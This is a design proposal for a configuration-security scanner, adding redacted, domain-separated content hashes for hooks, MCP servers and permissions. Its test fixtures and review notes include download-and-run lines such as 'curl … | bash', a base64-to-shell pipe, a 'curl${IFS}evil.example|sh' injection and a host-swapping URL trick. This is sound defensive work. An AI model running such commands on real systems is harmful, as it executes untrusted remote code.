<!-- SPDX-License-Identifier: MIT -->
# 009 — Hooks, MCP servers and permissions have no hash, so the gate and the reputation allowlist never "recognise" them

- **Source**: the artifact hash of hooks, MCP servers and permission lists is empty. The gate's SessionStart and the
  reputation allowlist identify content by hash, so they always judge these three kinds as unknown; the same config on
  two machines also has no shared identity. Ported from P-051 in the former private repository agent-guard
- **Depends on**: none
- **Branch**: `p/009-content-hash-three-kinds`

<!-- No "Status" line: the directory the file is in is the status (draft/ design/ complete/ rejected/), see README.md. -->

## Problem

`ArtifactReport.Hash` is the key shared by the reputation allowlist and gate approvals (`.claude/rules/hash.md`). Skills,
plugins, single files and connectors all have one; **hooks, MCP servers and permissions never have** — collection
hard-codes the empty string:

| Location | What goes into Hash |
|---|---|
| `internal/collect/hooks.go:64` (every hook; both settings.json hooks and plugin-bundled hooks go through here) | `""` |
| `internal/collect/collect.go:485` (every MCP server: `~/.claude.json`, the project `.mcp.json`, the plugin `.mcp.json`) | `""` |
| `internal/collect/collect.go:549`, `:553` (`permissions` allow/deny, and the `settings env` block) | `""` |

And every consumer reads `""` as "nobody reviewed this":

- `gate.Store.Approved("")` is always false (`internal/gate/approvals.go:129-135`, pinned by
  `TestEmptyHashIsNeverApproved`), and `Store.Approve` returns immediately on `""` and stores nothing
  (`approvals.go:167-175`);
- `reputation.DB.Match("")` is always false (`internal/reputation/reputation.go:111-117`);
- the gate's `SessionStart` skips approved artifacts by `Approved(a.Hash)` (`internal/gate/hook.go:381`); these three
  kinds can never be skipped;
- `aguard hash <root>` prints an empty hash for these three kinds (`cmd/aguard/main.go:827`).

Consequences:

- **These three kinds are the half the gate cannot hold** (live from the first turn of the session, no load event), yet
  they are also the only kind that **cannot even be "recognised"**: the same config, the same hook, is "new" on every
  machine and in every session; and no entry for them can be recorded in the reputation allowlist (`reputation.New` drops
  entries with an empty key).
- **When the worst artifact is a hook/MCP/permission, `aguard approve <root>` prints `approved … hash ` and then stores
  nothing** — `Approve` silently dropped the empty key.

Run by hand with a binary built from `main` (`dec64ca`) against a temporary root (2026-10-09): one `PreToolUse[Bash]` hook
runs `sh ~/.claude/hooks/pre.sh`, and the script contains `curl … | bash`:

```
aguard hash <root>          →   "  hook:PreToolUse[Bash]#1" (the hash column is empty)
aguard approve <root>       →   approved hook "PreToolUse[Bash]#1" (75/100, accepted-risk)
                                  hash                                  ← empty
                                exit 0; .aguard-approvals.json has "approvals": {}
SessionStart                →   still lists hook PreToolUse[Bash]#1 75/100 EXEC-001
```

On a real machine (the local `~/.claude`, 2026-10-09, the same `main` binary): 29 hooks, 27 MCP servers, 2 permission
artifacts — **all 58 Hashes are the empty string**; the other 117 artifacts all have a hash.

## Initial direction

In the detect stage (that is where `Redact` and script following live; collect cannot import detect), compute a
**content-based** hash for these three kinds: with a kind prefix for domain separation, excluding `OwnerRoot` and any local
absolute path; canonical JSON with sorted keys for MCP/permission; secret values redacted first (the hash is printed into
JSON and stored in approvals, so it must not be a digest of a credential); the hook hash includes the content of the
scripts it follows. `TreeHash`/`FileHash` do not change by a single character (reputation entries and stored approvals
depend entirely on them). Fill it in `analyze()` before reputation, the gate and `approve`; `aguard hash` in step.

## Design

One function, `detect.ContentHashes(root, arts)`, returns a copy and fills a value only for hook / mcp / permission
artifacts whose Hash is empty and that do not carry `PARSE-000` (`SrcParseError`); other kinds are returned unchanged.
`analyze()` calls it **immediately** after `detect.Run`, before permcheck, reputation, ignore and the judge — the gate's
`SessionStart` (via `scanEnv`), `aguard approve` (via `checkTarget`) and the Downloads path (via `checkTarget`) all come
after it. `aguard hash` calls the same function after `CollectTarget`.

**Definition**: `hex(sha256(<domain> 0x00 <canonical JSON>))`.

| Kind | Domain | What is in the canonical JSON | Explicitly excluded |
|---|---|---|---|
| hook (command) | `aguard:hook:v1` | `event`, `matcher`, `entry`: this hook's own JSON object **in full** (collect keeps it verbatim in `Hook.Entry`; redacted view), `scripts`: one item per script reference in the command, in order of appearance | artifact name (`#n` ordinal, plugin suffix), settings file path, `OwnerRoot`, the resolved path of the script |
| hook (http) | `aguard:hook:v1` | `event`, `matcher`, `entry` (as above) | as above |
| mcp | `aguard:mcp:v1` | the whole `mcpServers.<key>` entry, every string value in its redacted view | server name (it is a label, for the same reason a skill's directory name is not in the tree hash), file path |
| permission | `aguard:permission:v1` | `{"permissions": <the whole permissions object, redacted view>, "scripts": [scripts referenced by allow entries]}` | scope suffix, file path |
| settings env | `aguard:settings-env:v1` | the `env` object, values in their redacted view | as above |

- **Each item of `scripts`**: followed exactly the same way as in `hookUnits` / `permissionUnits` (`resolveHookScript`,
  falling back to `resolveInOwnerRoot` on failure; resolved but not inside HOME → not read). Read →
  `"sha256:<collect.FileHash>"` (streamed, refuses non-regular files, not subject to the 1 MiB scan cap); the path has a
  variable/glob or the file does not exist → `"unresolved"`; outside HOME → `"outside-home"`; exists but cannot be read →
  `"unreadable"`. **The three markers differ from each other**, for the same reason as `TreeHash`'s `unreadableMark`:
  "there is no X" and "X cannot be read" must not share a key. This never yields an empty hash.
- **Canonical JSON**: `json.Decoder.UseNumber` (numbers keep their original text), `encoding/json` sorted keys,
  `SetEscapeHTML(false)`, arrays keep their order. **Not RFC 8785 / JCS** (see "Must not claim").
- **Redacted view**: the **credential half** of `Redact` (passwords in URLs, `-u user:pass`, `--token x`, key-declared
  assignments, known-prefix tokens), **without the high-entropy catch-all**; **a replacement may only forget a secret,
  never take away structure** (open questions 3, 11): if a replacement would erase structural characters, the value goes
  into the hash unchanged. What counts as structure depends on what reads the value — for shell values (a hook's command;
  an MCP entry's `command` and `args`; the pattern inside the parentheses of a permission entry `Tool(…)`) it is
  `` $ ` ( ) ; | & < > \ * ? # [ ] { } ``, for other values the URL separators `# ? \`. String values inside objects go
  through in the form `KEY=VALUE` (in env the key is the signal: in `DB_PASSWORD=hunter2`, `hunter2` alone is recognisable
  to nobody); a value in an array that immediately follows an element starting with `-` goes through in the form
  `flag value` (`["--api-key", "…"]`).
- **Why redact first**: the hash is printed into the `--json` report and stored in the approvals file; a digest of a
  low-entropy secret is a commitment anyone can brute-force back (the W-006 rule: no Hash may be a digest of a
  credential). Approvals and the reputation allowlist are keyed by content; the hash need not, and should not, bind to the
  secret on one particular machine.
- **`Redact` itself does not change by one byte of behaviour**: it is split into two steps, `redactCredentials` (the
  credential half) + `redactEntropy`, with `Redact = redactEntropy(redactCredentials(s))`.
- **Plugin-bundled MCP servers**: the artifact name carries a ` (plugin …)` suffix, the key in the config does not.
  `ArtifactReport` gains a non-serialised `MCPServer` (collect fills in the key), and the hash finds the entry by it
  (open question 6).
- **The root goes through `filepath.Abs` first** (open questions 10, 11): the trailing slash in `--root ~/.claude/` makes
  home == root, `aguard hash .` makes home `.`, scripts under `~/…` all resolve into the wrong directory, and the same
  config has two identities depending on how the path was typed.

## Done criteria

- [x] `TestContentHashGolden` (`internal/detect/contenthash_test.go`, new): five fixed fixtures (a command hook that
  follows a script, an http hook, an MCP server, permissions, settings env) → the canonical input **bytes** equal a literal
  string and the hash equals a literal constant. The hash can be **computed by hand**:
  `printf 'aguard:hook:v1\0%s' '<literal string>' | shasum -a 256`. W1 red at compile time (no `ContentHashes`)
- [x] `TestContentHash_SameConfigTwoMachines` (same file, new): the same hook config + a script with the same content
  placed under two different homes; the same plugin hook under two different `OwnerRoot`s; the same MCP entry in two files
  at different paths, with the server renamed → hashes pairwise equal and non-empty; a root with a trailing slash, or
  written as `.` → the same hash
- [x] `TestContentHash_HookFollowsItsScript` (new): changing the script a settings hook follows / the script a plugin hook
  follows inside its own tree → the hash changes
- [x] `TestContentHash_ScriptThatCannotBeReadIsMarked` (new): script `chmod 000` → the hash is non-empty, and differs from
  the readable case and from the case where the script does not exist; does not exist / path has a variable →
  `unresolved`; resolves outside HOME → `outside-home`; the three markers are pairwise different (the `chmod` half is
  skipped when running as root)
- [x] `TestContentHash_SecretsAreNotDigestInputs` (new): MCP env `DB_PASSWORD`, an `Authorization` header, `-u admin:…` in a
  hook command, a password in a URL — two different secrets get the **same** hash, equal to the hash when the secret is
  written as `<REDACTED>`, and the canonical input does not contain the secret's original text (**intentional**: changing
  only the secret does not re-key). The reverse in the same test: replacing the URL password position with `$(…)` → the
  hash changes; replacing a base64 payload that has no declaring key → the hash changes; changing a non-secret argument →
  the hash changes
- [x] `TestContentHash_ReplacementNeverTakesStructure` (new, open question 11): control group — a password in an exact
  grant, a token in a grant, a password in an MCP url: two different secrets still get the same hash and do not enter the
  input; reverse — `Bash(curl -u admin:hunter2)` → `…admin:*)`, `Bash(deploy --token abc123)` → `…--token *)`, the
  "password" in an MCP / http hook url replaced with `443#` / `443?` so that the host changes, the password position of a
  hook command replaced with a glob, the same command with a different hook type, the same entry with one added field —
  all seven pairs re-key, and all are red against an implementation without the structure guard that hashes only four
  fields
- [x] `TestContentHash_KindsAreDomainSeparated` (new): the same canonical bytes under the four domains → four mutually
  different values, none of them equal to the bare sha256 of those bytes
- [x] `TestReputation_RecognisesAHook` (`cmd/aguard/contenthash_test.go`, new): scan a fixture with a hook, build a
  `malicious` reputation entry from its hook hash → that hook gets `REP-BAD`. W1 red (the hash is the empty string, and
  `reputation.New` drops the entry outright)
- [x] `TestGate_ApprovedHookLeavesSessionStart` (`cmd/aguard/gate_e2e_test.go`, new): a hook in the root that follows a
  `curl | bash` script; after `approvePath(root)` approvals hold **one** hook record and `SessionStart` no longer lists it;
  then change the script it follows → `SessionStart` lists it again. W1 red: prints `approved` while approvals are empty,
  and `SessionStart` lists it all the same
- [x] `TestHashCommand_PrintsConfigHashes` (`cmd/aguard/contenthash_test.go`, through the real binary, new): every hook /
  mcp / permission line of `aguard hash <root>` is 64 hex characters and equals the `hash` of the same artifact in
  `scan --json`. W1 red (empty)
- [x] Reverse assertion `TestScan_OnlyConfigHashesChange` (`cmd/aguard/contenthash_test.go`, new, lands with W5): the same
  fixture (hook, MCP in two places, permissions, env, skill, CLAUDE.md) scanned once with this step off and once with it
  on; after blanking the `hash` of the three kinds the JSON is **byte-for-byte identical**; not one `hash` of the other
  kinds changes
- [x] Reverse assertion `TestContentHash_ParseErrorArtifactsStayUnhashed` (new): a broken `settings.json` /
  `.claude.json` → the Hash of the `PARSE-000` artifact is still `""`; `TestEmptyHashIsNeverApproved` stays green without a
  single character changed
- [x] Reverse assertions that stay green without a single character changed: `TestHashGolden` (two constants),
  `TestAdversarial_ConcurrencyDoesNotChangeOutput`, `TestRun_ConcurrentDeterministic`, `TestImports_CredentialFileRefused`
  (W-006), all of `internal/detect/redact_test.go`. (`TestCollectHooks_PerCommand` compares `model.Hook` as a whole; now
  that `Hook` has `Entry`, it clears that field before comparing, and a new assertion checks that `Entry` equals the
  original text — none of the original four field assertions was dropped)
- [x] On a real machine: compare `scan --root ~/.claude --quiet --json` before and after; **only** the `hash` of hook /
  mcp / permission differs; record numbers, not names
- [x] `make verify` green; `go version` shows no toolchain switch

## Out of scope

- **`TreeHash` / `FileHash` / `ExcludeFromHash` / `connectorHash` do not change**: the diff of `internal/collect/hash.go`,
  `hash_test.go`, `skip.go` and `connectors.go` is empty. Reputation entries and stored approvals depend entirely on them
- **No finding, score or note changes**: proven by the differential test + the real-machine comparison; **the existing
  gap that plugin-bundled MCP servers are not reached by the rules is not fixed here** (open question 6)
- **The gate code does not change** (`internal/gate` diff is empty): no new approval entry point, no new path that writes
  approvals; `SessionStart` still only informs and does not block
- **`approvePath` does not change**: for artifacts that still have an empty hash (the `PARSE-000` ones) it still prints
  `approved` and stores nothing — handled separately by P-011
- **Reputation data does not change**: `internal/reputation/data/reputation.json` gets no entries for these three kinds
- **The code of MCP servers is not hashed** (npx packages, local scripts in args): detect does not follow them either;
  only the config entry is hashed
- **The whole `settings.json` / `.claude.json` is not hashed**: several artifacts share one file, `.claude.json` changes
  every session, and the hash would equal the file hash stored by `aguard approve settings.json`
- **Scripts outside HOME are not read for the hash** (invariant #2): only `outside-home` is recorded
- **Command text is not rewritten**: absolute paths hard-coded in a command go into the hash as written, not replaced
  with `~`
- **The false negative where detect does not follow hook scripts when `--root` has a trailing slash / is relative is not
  fixed here** (open question 10, P-010)
- Human-readable reports (text / markdown / html / sarif) show no new content (`internal/report` diff is empty; they never
  printed hashes); `internal/judge` does not change; no new dependencies, `go.mod` / `go.sum` do not change; the
  `docs/install-gate.md` pair does not change (no new user action)

## Must not claim

- **Do not say "changing any single byte asks again"**. The segment replaced by redaction (key-declared secret values,
  known-prefix tokens, passwords in URLs / flags, when they contain no structural characters) can change without changing
  the hash — intentional (decision 1). **Also do not say "this never lets anything through silently"**: for a config that
  at approval time already "decodes a variable with a credential name and executes it", swapping the payload encoded in
  that value leaves the hash unchanged; the same goes for MCP env / headers if the server itself evals them. Keeping the
  high-entropy catch-all out of the hash view and leaving replacements that contain structural characters unchanged closes
  base64 payload swaps, `$(…)` / glob / grant wildcards and URL host changes (open questions 3, 11); everything that is
  left requires the approved config itself to already be "decoding / evaluating a credential value"
- **Do not say "secrets do not enter the hash"**, only "the ones `Redact` recognises do not". `Redact` is best-effort:
  `MYSQL_PASS=hunter2` (`credKeys` has no `pass`), `--db-password hunter2` (`flagSecretRE` requires the value to follow
  `--password` directly), `mysql -phunter2` are all unrecognised; these values go into the digest input unchanged, and the
  digest can be brute-forced back (open question 11). Fixing that requires changing `redactCredentials`, which re-keys all
  three kinds and also changes the snippets in reports; a separate proposal
- **Do not say "a hook's hash covers everything it runs"**: when a script is outside HOME, has a variable in its path, or
  cannot be read, the hash holds only a marker, and changing the script itself does not change the hash; the MCP hash
  covers only the config entry, not the server's code
- **Do not say "these three kinds can never equal a file hash"**: a single-file hash is the sha256 of arbitrary bytes, and
  a file whose bytes happen to be "domain + 0x00 + canonical JSON" has the same value. Equality with a tree hash, or with
  each other, requires a sha256 collision
- **Do not say the canonical JSON is RFC 8785 / JCS**: numbers keep their original text (JCS normalises them), `\b` `\f`
  are written as `\u0008` `\u000c`, keys are sorted by UTF-8 bytes (JCS sorts by UTF-16). Anyone recomputing this hash
  elsewhere has to follow this repository's definition, not JCS
- **Do not say "the gate can now hold hooks / MCP"**: this proposal only gives "approved" a meaning for these three kinds.
  Also do not say "a single hook can be approved on its own": the only entry point is still `aguard approve <root>`, which
  takes the worst artifact
- **Do not say "the same config has the same hash on every machine"**: absolute paths hard-coded in commands and
  high-entropy tokens without a declaring key make configs differ by themselves
- **Do not say plugin-bundled MCP servers are scanned by the rules** (they are not, see open question 6)

## Work items

| W | In one sentence | Commit message (no sha; a rebase changes it) |
|---|---|---|
| 1 | detect: six property tests + two reverse ones (red at compile time); cmd: three user-visible tests (red on assertion) | `detect, cmd: tests — hooks, MCP servers and permissions hash to "", so approve stores nothing, SessionStart can never skip them and no reputation entry can match (P-009)` |
| 2 | `Redact` split into the credential half + the high-entropy catch-all, behaviour unchanged by one byte | `detect: Redact is the credential half plus the entropy catch-all, so a hash can take the first without the second (P-009)` |
| 3 | `ArtifactReport.MCPServer` (not serialised), collect fills in the key | `model, collect: an MCP artifact carries its server's key, because a plugin server's name has a suffix the config does not (P-009)` |
| 4 | `detect.ContentHashes`: four domains, canonical JSON, redacted view, script digests and three markers | `detect: hooks, MCP servers and permission lists get a content hash — domain-separated, path-free, secrets out, the followed script in (P-009)` |
| 5 | `analyze()` fills it right after Run; `aguard hash` in step; differential test | `cmd: scan, check, the gate and aguard hash see the content hash before anything reads it (P-009)` |
| 6 | The spec §4 table and the §8 Hash scope; `.claude/rules/hash.md` (add paths and the definition, consequences of re-keying); `gate.md`'s SessionStart; the architecture pair | `docs: spec, hash.md, gate.md and the architecture pair define the three content hashes and what re-keys them (P-009)` |
| 7 | Review fixes (open question 11): the hook hash takes the whole entry (`Hook.Entry`); a replacement may not take structure (three readings: shell / grant / literal); the root goes through `Abs` | `detect, collect: widening a grant, moving a URL's host or changing a hook's type now re-keys, and how the root was typed no longer does (P-009)` |
| 8 | The loading table in `CLAUDE.md`: `hash.md` now also covers `internal/detect/contenthash*.go` | `docs: CLAUDE.md's loading table names the content-hash file hash.md now covers (P-009)` |
| 9 | This file, the index | `proposals: P-009 (P-009)` |

## Open questions

1. **At which layer is it computed, and how are secrets handled?**
   **Decided (2026-10-09, by the maintainer)**: computed in the detect stage (that is where `Redact` and script following
   live), redacting before hashing (hook command / url; MCP command / args / env / url / headers values; values of the
   settings env block). The consequence that has to be written down as it is: changes to `Redact` re-key these three
   kinds — the direction is safe (one more prompt / re-review, never a silent pass). Made precise at implementation:
   changing `redactCredentials` (the credential half) re-keys; changing the high-entropy catch-all does not (open
   question 3).
2. **Does the hook hash include the scripts it follows?**
   **Decided (2026-10-09, by the maintainer)**: yes, using the same following detect already has; cannot be read / cannot
   be resolved → a fixed marker goes into the hash input, never an empty hash, and never quietly the entry alone,
   consistent with how `TreeHash` treats unreadable entries.
3. **Does the hash use all of `Redact`, or only the credential half?**
   **Recommendation**: only the credential half; values a shell will interpret get an additional metacharacter guard. Two
   measured shapes (this repository's `main` `Redact`, 2026-10-09): `echo <base64> | base64 -d | sh` →
   `echo <REDACTED> | base64 -d | sh`, two different payloads give the same view;
   `curl -u admin:$(curl${IFS}evil.example|sh) …` → `curl -u admin:<REDACTED> …` (the character class is `[^\s'"]+`),
   likewise unchanged. And high-entropy strings are not at risk of leaking through a digest anyway — a digest only leaks
   what can be guessed; W-006 defends against low-entropy secrets like `hunter2`, and those are all caught by the key /
   flag / URL patterns. The guard is added only on values a shell interprets: there, a `$(` in an unquoted, substitutable
   fragment makes it code, not a literal password; a `pa$$w0rd` in env, a header or a url is a literal value and is
   replaced as usual. Cost: high-entropy tokens without a declaring key give "the same config" on two machines different
   hashes — the direction is safe (reputation does not match, the approval does not cover, one more prompt), not a silent
   pass.
   **Decided (2026-10-09)**: as recommended. **Confirmed by the maintainer (2026-10-09)**: the two narrowings of decision 1
   are accepted (only the credential half; a replacement may not take structure).
4. **Does the permission hash include the scripts referenced by allow entries?**
   **Recommendation**: yes, with the same following and markers as hooks. Some of the findings on this artifact **come
   from those scripts** (`permissionUnits`); if the approval does not bind them, that amounts to "the scripts changed, the
   findings changed, the approval stands". Only allow is followed (consistent with `permissionUnits`).
   **Decided (2026-10-09)**: as recommended.
5. **Do names go into the hash?**
   **Recommendation**: no. A hook's `#n` ordinal and plugin suffix and an MCP server's name are labels, for the same reason
   a skill's directory name is not in the tree hash; `event` / `matcher` go in, because they decide when it runs.
   Consequence: two identical hooks under the same event have the same hash (the approval binds the bytes).
   **Decided (2026-10-09)**: as recommended.
6. **How is the entry of a plugin-bundled MCP server found?**
   **Recommendation**: `ArtifactReport` gains a non-serialised `MCPServer`, collect fills in the key from the config, and
   the hash finds the entry by it; **detection does not change with it this time**. Along the way an existing gap was
   measured (this repository's `main`, 2026-10-09): the name of a plugin MCP artifact carries a ` (plugin …)` suffix,
   `unitsFor` looks the entry up in `mcpServers` by name, **does not find it, zero units** — the same
   `bash -c "curl … | bash"` entry gets 75 with `EXEC-001` when written in `~/.claude.json`, and 100 with zero findings
   when written in a plugin `.mcp.json` (`evil (plugin p@mkt)`). The comment on `mcpServersFrom` itself says that a
   decorated name misses, gives zero units and is recorded as a clean 100. Fixing it changes findings and scores; a
   separate proposal.
   **Decided (2026-10-09)**: as recommended.
7. **One marker for unreadable scripts, or one per cause?**
   **Recommendation**: three (`unresolved` / `outside-home` / `unreadable`). A single marker would give "the script does
   not exist" and "the script exists but cannot be read" the same key — exactly what `TreeHash` changed back then.
   **Decided (2026-10-09)**: as recommended.
8. **Fill it inside `Run`, or in `analyze()` after `Run`?**
   **Recommendation**: in `analyze()` right after `Run`. The other caller of `Run` (`clean`'s restore preview) does not
   read hashes; with it in `analyze()`, `cmd/aguard` can turn this step off through a package-level variable (the
   `termraw.go` precedent), and only then can the differential test prove "only hash changed".
   **Decided (2026-10-09)**: as recommended.
9. **Does the behaviour change of `aguard approve <root>` overstep the scope?**
   **Recommendation**: no; write it down as it is. Before, when the worst artifact was a hook / MCP / permission, it
   printed `approved … hash ` and stored nothing (the manual run in "Problem"); now it stores that hash, and `SessionStart`
   stops listing it afterwards. No new write path; approval still needs a person to type the command; the gate's
   `PreToolUse` only meets these three kinds when the resolved skill directory itself looks like a root (is named
   `.claude`), and that path's "clean means remembered" rule does not change. The ones whose hash is still empty
   (`PARSE-000`) are handled by P-011.
   **Decided (2026-10-09)**: as recommended.
10. **When `--root` has a trailing slash, detect does not follow the hook's scripts — should the hash be wrong along
    with it?**
    `detect.hookUnits` uses `filepath.Dir(root)` as home, without a `Clean` first as `CollectAll` does. Same fixture (the
    hook runs `sh ~/.claude/hooks/pre.sh`, the script contains `curl … | bash`), measured on this repository's `main`:
    `scan --root …/.claude` gets 75 with 1 `EXEC-001`; `scan --root …/.claude/`, and `scan --root .` run inside `.claude`,
    both get **100 with 0 findings** — shell completion adds that slash by itself.
    **Recommendation**: on the hash side, normalise the root first (both spellings, one identity, pinned by
    `TestContentHash_SameConfigTwoMachines`; through `Abs`, see 11); the detect false negative is **not fixed in this
    proposal** (it changes findings and scores, crossing the "only hash changes" criterion) and is split out as P-010.
    **Decided (2026-10-09)**: as recommended.
11. **How are the five items reported by the independent review (a read-only subagent, against the W1–W6 diff)
    handled?**
    - Blocking: **the password position in a grant can swallow the grant wildcard** — `Bash(curl -u admin:hunter2)` and
      `Bash(curl -u admin:*)`, `Bash(deploy --token abc123)` and `…--token *)` have the same hash (the value class
      `[^\s'"]+` of `flagUserPassRE` / `flagSecretRE` can eat `*` and the closing parenthesis; this repository's `Redact`
      was measured turning all four into `…<REDACTED>`, closing parenthesis included); an approved exact grant is widened
      into a wildcard, and `SessionStart` still treats it as approved.
    - Should fix: **the "password" segment of a URL can change the host** — `https://other.example:pw@good.example/mcp`
      and `https://other.example:443#@good.example/mcp` have the same hash (both become
      `https://other.example:<REDACTED>@good.example/mcp`), and the latter actually connects to other.example (the value
      class of `urlCredRE` can eat `#` `?` `\`).
    - Should fix: **the hook hashed only part of its entry** — anything non-http is treated as `"command"`, so
      `{"type":"prompt","command":"true"}` and `{"command":"true"}` have the same hash; the entry's other fields (timeout,
      header…) are not in the input.
    - Should fix: **low-entropy secrets `Redact` does not recognise went into the digest** — `MYSQL_PASS`,
      `--db-password`, `-p<pw>` (this repository's `Redact` was measured passing all three through unchanged).
    - Note: **a relative root** (`cd ~/.claude && aguard hash .`) hashes differently from an absolute root; and the race
      between the hash and the scan each re-reading the file (same class as `TreeHash`, pre-existing).
    **Recommendation**: fix the first three and the relative root in this proposal (all of them are "an approval covering
    bytes nobody was shown" or "one config, two identities", which is exactly this proposal's goal, and none of them
    changes any finding, score or note): a replacement may only forget a secret, never take structure —
    `` $ ` ( ) ; | & < > \ * ? # [ ] { } `` in shell / grant patterns, the URL separators `# ? \` in other values; a
    permission entry is first split into `Tool(…)` and the pattern inside the parentheses is read as shell; the hook hash
    takes the whole entry collect keeps verbatim (`model.Hook.Entry`, a string, so that `Hook` stays comparable); the root
    goes through `filepath.Abs`. The fourth is not fixed here (it needs a change to `redactCredentials`, which re-keys all
    three kinds **and** changes report snippets); it is written into "Must not claim" and split out. The race is written
    down as it is in the review package. The seven reverse pairs (`TestContentHash_ReplacementNeverTakesStructure`)
    should all be red against the pre-review implementation and all green after the fix; the two hook goldens are
    recomputed by hand under the new definition.
    **Decided (2026-10-09)**: as recommended. **Confirmed by the maintainer (2026-10-09)**: the two narrowings of
    decision 1 are accepted (only the credential half; a replacement may not take structure).

## Done

Manual run (the same fixture as in "Problem", built once from `main` `dec64ca` and once from this branch, one process per
step):

```
                         before (main dec64ca)                       after (this branch)
aguard hash <root>       "  hook:PreToolUse[Bash]#1" (empty hash)    64 hex chars; root with a trailing slash → the same value; with
                                                                     plugins/installed_plugins.json in the root, hash . inside the root → the same value (*)
aguard approve <root>    approved … hash (empty); approvals {}       approved … hash 4f097648…; approvals: 1 entry (kind=hook, accepted-risk)
SessionStart             lists hook PreToolUse[Bash]#1 75/100        "no unapproved artifact carries a finding at or above high"
edit the hook's script   —                                           SessionStart lists it again
```

(*) A directory that has no `installed_plugins.json` and is not named `.claude` is treated by `aguard hash .` as a
`directory` artifact with a tree hash, and never goes through root collection at all — that is the existing behaviour of
`collect.looksLikeRoot`, unrelated to this proposal; every `~/.claude` with plugins installed has this file.

```
Merged: PR #29 (2026-10-09; find the sha with git log --grep P-009)
Released: v0.19.0
Evidence: TestContentHashGolden (internal/detect/contenthash_test.go); W1 red at compile time (undefined: ContentHashes / contentHashInput / configDoc / scriptUnresolved…, unknown field MCPServer) → W4 green; after W7 the five constants and the two script digests were recomputed by hand in this repository with printf … | shasum -a 256, all seven values match
Evidence: TestReputation_RecognisesAHook (cmd/aguard/contenthash_test.go); W1 red "the hook has no hash, so no reputation entry can ever match it" → W5 green: a malicious entry built from the hook hash matches, REP-BAD on the hook
Evidence: TestGate_ApprovedHookLeavesSessionStart (cmd/aguard/gate_e2e_test.go); W1 red "approve printed success; the store holds 0 approval(s), want the hook's one" → W5 green: approvals hold 1 entry (kind=hook), SessionStart no longer lists it; change the script it follows → listed again
Evidence: TestHashCommand_PrintsConfigHashes (cmd/aguard/contenthash_test.go, through the real binary); W1 red: the five lines mcp:db, hook:PreToolUse[Bash]#1, permission:permissions, permission:settings env, mcp:fs print an empty hash → W5 green: all five lines are 64 hex chars, each equal to scan
Evidence: TestContentHash_ReplacementNeverTakesStructure (internal/detect/contenthash_test.go); with contenthash.go temporarily swapped back to the W4 version (the pre-review implementation): the seven pairs 7/7 red, plus 1 red for the relative root in SameConfigTwoMachines → all green after restoring; control group (two different secrets at the same position) still the same hash
Evidence: mutation checks (temporary change, run, restore, not committed): structure guard removed → SecretsAreNotDigestInputs, ReplacementNeverTakesStructure red; hash view uses the full Redact → SecretsAreNotDigestInputs red (the base64 pair); hook without its script → Golden, SameConfigTwoMachines, HookFollowsItsScript, ScriptThatCannotBeReadIsMarked, 4 red; unreadable merged into unresolved → ScriptThatCannotBeReadIsMarked red; root normalisation removed → SameConfigTwoMachines red; this step made to also add a finding → TestScan_OnlyConfigHashesChange red
Evidence: reverse assertion TestScan_OnlyConfigHashesChange (cmd/aguard/contenthash_test.go): the same fixture scanned once with this step off and once with it on; after blanking the hash of the three kinds the JSON is byte-for-byte identical, the hash of the other kinds unchanged
Evidence: reverse assertions green without a single character changed — TestHashGolden, TestEmptyHashIsNeverApproved, TestAdversarial_ConcurrencyDoesNotChangeOutput, TestRun_ConcurrentDeterministic, TestImports_CredentialFileRefused, all of internal/detect/redact_test.go (git diff --stat origin/main of the five test files they live in and of redact_test.go is empty); TestContentHash_ParseErrorArtifactsStayUnhashed: both PARSE-000 artifacts are still ""
Evidence: real machine ~/.claude (the main and this branch's binaries, one --quiet --json scan each, back to back): the hash of 58 artifacts, hook 29 / mcp 27 / permission 2, "" → 64 hex chars (distinct values 29 / 17 / 2; in MCP the same config appears in several places, and names do not enter the hash); of the other 117 artifacts, 0 hashes changed; after removing scanned_at / tool_version and blanking the hash of the three kinds the two JSONs are equal; overall 69 → 69, notes 10 → 10, artifacts 175 → 175
Evidence: Out of scope — git diff --stat origin/main -- go.mod go.sum internal/collect/hash.go internal/collect/hash_test.go internal/collect/skip.go internal/collect/connectors.go internal/gate cmd/aguard/gate.go internal/report internal/judge internal/reputation internal/score internal/permcheck docs/install-gate.md docs/install-gate.zh-CN.md docs/rules.md is empty
Evidence: make verify: all gates passed; go version go1.23.5 (no toolchain switch); line 2 of go.mod is go 1.23.5
```
